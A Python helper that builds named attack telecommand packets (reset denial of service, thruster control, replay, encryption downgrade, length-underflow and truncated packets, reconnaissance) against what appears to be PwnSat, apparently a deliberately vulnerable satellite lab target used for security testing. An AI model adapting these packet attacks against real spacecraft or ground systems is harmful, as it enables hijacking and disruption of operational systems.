from __future__ import annotations

import sys
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(SCRIPT_DIR))

from pwnsat_crypto import encrypt_payload
from spp_tools import build_primary_header, build_tc


def build_secure_tc(apid: int, payload: bytes = b"", sequence_count: int = 1) -> bytes:
    return build_tc(apid, encrypt_payload(payload), sequence_count)


def build_plain_tc(apid: int, payload: bytes = b"", sequence_count: int = 1) -> bytes:
    return build_tc(apid, payload, sequence_count)


def build_broadcast_payload(frequency: int, message: bytes) -> bytes:
    return frequency.to_bytes(2, "big") + message


def build_gs_handshake_start_payload() -> bytes:
    return b"\x00"


def make_attack(name: str) -> list[bytes]:
    if name == "reset-dos":
        return [build_secure_tc(0x02, b"", 1)]
    if name == "firmware-disclosure":
        return [build_secure_tc(0x03, b"", 1)]
    if name == "thruster-control":
        return [build_secure_tc(0x04, bytes([0x00, 0x64]), 1)]
    if name == "beacon-flood":
        return [build_secure_tc(0x05, bytes([0x00]), 1)]
    if name == "broadcast-underflow":
        return [build_primary_header(0x06, packet_type=1, sequence_count=1, data_len=0)]
    if name == "truncated-spp":
        return [build_primary_header(0x01, packet_type=1, sequence_count=1, data_len=32) + b"A"]
    if name == "flash-block":
        return [build_secure_tc(0x07, b"", 1)]
    if name == "replay":
        packet = build_secure_tc(0x01, b"", 9)
        return [packet, packet]
    if name == "status-recon":
        return [
            build_secure_tc(0x03, b"", 1),
            build_secure_tc(0x0C, b"", 2),
            build_secure_tc(0x0E, b"", 3),
            build_secure_tc(0x0F, b"", 4),
        ]
    if name == "aes-downgrade":
        return [
            build_plain_tc(0x0A, b"\x00\x00", 1),
            build_plain_tc(0x0C, b"", 2),
            build_plain_tc(0x0E, b"", 3),
        ]
    if name == "mission-mode-abuse":
        return [
            build_secure_tc(0x0D, b"\x02", 1),
            build_secure_tc(
                0x06, build_broadcast_payload(0x03A0, b"PAYLOAD-ROUTE"), 2
            ),
            build_secure_tc(0x0F, b"", 3),
        ]
    if name == "gs-handshake-start":
        return [
            build_secure_tc(0x12, build_gs_handshake_start_payload(), 1),
        ]
    raise ValueError(name)
